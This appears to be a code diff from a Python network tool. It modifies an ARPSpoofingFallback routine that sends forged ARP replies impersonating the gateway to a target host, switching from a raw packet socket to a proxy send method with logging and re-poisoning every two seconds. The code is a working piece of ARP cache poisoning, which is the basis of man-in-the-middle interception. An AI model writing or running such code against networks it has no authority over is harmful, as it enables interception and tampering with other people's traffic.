@@ -1764,12 +1764,13 @@ class ARPSpoofingFallback:
                     try:
                         # ARP reply: we are gateway_ip
                         packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip)
-                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-                        sock.bind((iface, 0))
-                        sock.send(packet)
-                        sock.close()
+                        success, method, error = SocketProxy.send_packet(packet, iface)
+                        if not success:
+                            add_log('warn', f'ARP spoof to {target_ip} failed ({method}): {error}')
+                        else:
+                            add_log('dev', f'ARP spoof to {target_ip} via {method}')
                     except Exception as e:
-                        add_log('warn', f'ARP spoof to {target_ip} failed: {e}')
+                        add_log('warn', f'ARP spoof to {target_ip} exception: {e}')
 
                 time.sleep(2)  # Re-spoof every 2 seconds to maintain cache
 
